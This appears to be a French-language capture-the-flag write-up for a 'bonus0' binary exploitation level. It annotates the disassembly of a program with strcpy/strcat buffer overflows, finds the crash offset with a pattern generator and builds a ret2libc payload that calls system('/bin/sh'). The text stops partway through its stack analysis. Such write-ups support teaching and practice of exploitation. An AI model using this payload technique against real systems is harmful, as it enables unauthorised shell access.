```
080484b4 <p>:
 80484b4:	55                   	push   ebp
 80484b5:	89 e5                	mov    ebp,esp
 80484b7:	81 ec 18 10 00 00    	sub    esp,0x1018
 80484bd:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]		; ebp+12 (2e argument)
 80484c0:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c3:	e8 e8 fe ff ff       	call   80483b0 <puts@plt>			; puts(" - ")
 80484c8:	c7 44 24 08 00 10 00 	mov    DWORD PTR [esp+0x8],0x1000
 80484cf:	00 
 80484d0:	8d 85 f8 ef ff ff    	lea    eax,[ebp-0x1008]
 80484d6:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax		; char buff[0x1008];
 80484da:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 80484e1:	e8 9a fe ff ff       	call   8048380 <read@plt>			; read(0, buff, 0x1000);
 80484e6:	c7 44 24 04 0a 00 00 	mov    DWORD PTR [esp+0x4],0xa
 80484ed:	00 
 80484ee:	8d 85 f8 ef ff ff    	lea    eax,[ebp-0x1008]
 80484f4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f7:	e8 d4 fe ff ff       	call   80483d0 <strchr@plt>
 80484fc:	c6 00 00             	mov    BYTE PTR [eax],0x0			; *strchr(buff, '\n') = 0
 80484ff:	8d 85 f8 ef ff ff    	lea    eax,[ebp-0x1008]
 8048505:	c7 44 24 08 14 00 00 	mov    DWORD PTR [esp+0x8],0x14
 804850c:	00 
 804850d:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048511:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 8048514:	89 04 24             	mov    DWORD PTR [esp],eax
 8048517:	e8 d4 fe ff ff       	call   80483f0 <strncpy@plt>		; strncpy(char strn[] (1e arg), buff, 20)
 804851c:	c9                   	leave  
 804851d:	c3                   	ret    

0804851e <pp>:
 804851e:	55                   	push   ebp
 804851f:	89 e5                	mov    ebp,esp
 8048521:	57                   	push   edi
 8048522:	53                   	push   ebx
 8048523:	83 ec 50             	sub    esp,0x50
 8048526:	c7 44 24 04 a0 86 04 	mov    DWORD PTR [esp+0x4],0x80486a0	; " - "
 804852d:	08 
 804852e:	8d 45 d0             	lea    eax,[ebp-0x30]					; char str2[20]
 8048531:	89 04 24             	mov    DWORD PTR [esp],eax
 8048534:	e8 7b ff ff ff       	call   80484b4 <p>						; p(str2, " - ")
 8048539:	c7 44 24 04 a0 86 04 	mov    DWORD PTR [esp+0x4],0x80486a0	; " - "
 8048540:	08 
 8048541:	8d 45 e4             	lea    eax,[ebp-0x1c]					; char str3[28]
 8048544:	89 04 24             	mov    DWORD PTR [esp],eax
 8048547:	e8 68 ff ff ff       	call   80484b4 <p>						; p(str3, " - ")
 804854c:	8d 45 d0             	lea    eax,[ebp-0x30]
 804854f:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048553:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]			; copy_result = ebp+8
 8048556:	89 04 24             	mov    DWORD PTR [esp],eax
 8048559:	e8 42 fe ff ff       	call   80483a0 <strcpy@plt>				; strcpy(copy_result, str2)
 804855e:	bb a4 86 04 08       	mov    ebx,0x80486a4					; " "
 8048563:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]			; copy_result
 8048566:	c7 45 c4 ff ff ff ff 	mov    DWORD PTR [ebp-0x3c],0xffffffff	; -1
 804856d:	89 c2                	mov    edx,
 804856f:	b8 00 00 00 00       	mov    eax,0x0
 8048574:	8b 4d c4             	mov    ecx,DWORD PTR [ebp-0x3c]
 8048577:	89 d7                	mov    edi,edx
 8048579:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
 804857b:	89 c8                	mov    eax,ecx
 804857d:	f7 d0                	not    eax								; strlen(copy_result)
 804857f:	83 e8 01             	sub    eax,0x1
 8048582:	03 45 08             	add    eax,DWORD PTR [ebp+0x8]			; copy_result + strlen(copy_result);
 8048585:	0f b7 13             	movzx  edx,WORD PTR [ebx]				; 0x80486a4 sur 2 octets donc on copy " \0"
 8048588:	66 89 10             	mov    WORD PTR [eax],dx				; *(copy_result + strlen(copy_result)) = " \0"
 804858b:	8d 45 e4             	lea    eax,[ebp-0x1c]					; eax = str3
 804858e:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048592:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 8048595:	89 04 24             	mov    DWORD PTR [esp],eax
 8048598:	e8 f3 fd ff ff       	call   8048390 <strcat@plt>				; strcat(copy_result, str3)
 804859d:	83 c4 50             	add    esp,0x50
 80485a0:	5b                   	pop    ebx
 80485a1:	5f                   	pop    edi
 80485a2:	5d                   	pop    ebp
 80485a3:	c3                   	ret

080485a4 <main>:
 80485a4:	55                   	push   ebp
 80485a5:	89 e5                	mov    ebp,esp
 80485a7:	83 e4 f0             	and    esp,0xfffffff0
 80485aa:	83 ec 40             	sub    esp,0x40					; 64
 80485ad:	8d 44 24 16          	lea    eax,[esp+0x16]			; char str[42]
 80485b1:	89 04 24             	mov    DWORD PTR [esp],eax
 80485b4:	e8 65 ff ff ff       	call   804851e <pp>				; pp(str)
 80485b9:	8d 44 24 16          	lea    eax,[esp+0x16]
 80485bd:	89 04 24             	mov    DWORD PTR [esp],eax
 80485c0:	e8 eb fd ff ff       	call   80483b0 <puts@plt>		; puts(str)
 80485c5:	b8 00 00 00 00       	mov    eax,0x0
 80485ca:	c9                   	leave  
 80485cb:	c3                   	ret    
```


On va générer de très grandes strings :
```js
var letters = "abcdefghijklmnopqrstuvwxyz"  + "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

function gen() {
    var str = "";
    var repeat = 1;
    while (str.length < 4100) {
        for (let i = 0; i < letters.length && str.length < 4100; i++) {
        str += letters[i % letters.length].repeat(repeat);
    }
        repeat++;
    }
    return str.slice(0, 4100);
}
console.log(gen());
```

Pour la première partie, on utilise les lettres : `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`
Et pour la seconde : `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789`

Comme ça, on pourra trouver facilement l'endroit où on segfault et où on peut faire un `ret2libc` en modifiant l'adresse de `ret`.

On peut voir qu'après avoir injecté les deux strings, on obtient : `0x4d4c4b4a` soit `MLKJ` donc en JKLM en reverse. On a donc deux endroits où ça peut se produire, où au niveau du 35 caractère de la première partie, ou au niveau du 9e de la seconde. On aura juste à changer la seconde string pour savoir:
`letters = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz" `

`0x43424139`  => `9ABC`, par conséquent, c'est bel et bien la seconde chaine de caractère utilisée.

Donc, on devrais pouvoir appeler `system` en mettant `012345678<system_address><padding [ 4100 - 13 ]>`

Bon, offset de `/bin/sh` dans `objdump -s /lib/i386-linux-gnu/libc-2.15.so` = `0x160c58`

```
(gdb) x/1s 0xb7e2c000 +  0x160c58
0xb7f8cc58:	 "/bin/sh"
(gdb) x/10xw system
0xb7e6b060 <system>:	0x891cec83
```
donc on a l'adresse de `system` et de `/bin/sh`, testons:
```py
print("A" * 4095 + "\n")
print("0\x58\xcc\xf8\xb7\x58\xcc\xf8\xb7\x60\xb0\xe6\xb7" + "\x58\xcc\xf8\xb7" * 1019)
```

Marche pas. La commande `dmesg` nous renvoie les logs du crash du process:
`bonus0[3552]: segfault at b7f8ccd0 ip b7f8cc5f sp bffff774 error 7 in libc-2.15.so[b7e2c000+1a3000]`

Pour le debug, notons quelques return addresses :
- `0x080485b9` (`pp` dans le main)
- `0x08048539` (`p` dans `pp`)
- `0x0804854c` (`p` dans `pp`)

Le bug se situe lors du `ret` dans main.
Adresse de base de retour de main est : `0xb7e454d3`. On peut analyser la return adresse pour savoir ce qui se passe :
1. Dans le main, elle est au top la stack
2. Après l'instruction `and    esp,0xfffffff0`, on a perdu 12 octets sur le pointeur `esp`.
3. On retire à `esp` 64 octets, on se retrouve donc avec un espace de 76 octets avant d'écraser l'adresse du main.
4. On va déclarer notre buffer à `esp + 22`, ce qui nous rapproche à 44 octets de notre adresse.
5. En arrivant dans `pp`, on insère les adresses de retour, et on pointe sur `0xbffff6e0`, soit désormais 92 octets avant l'adresses de retour
6. 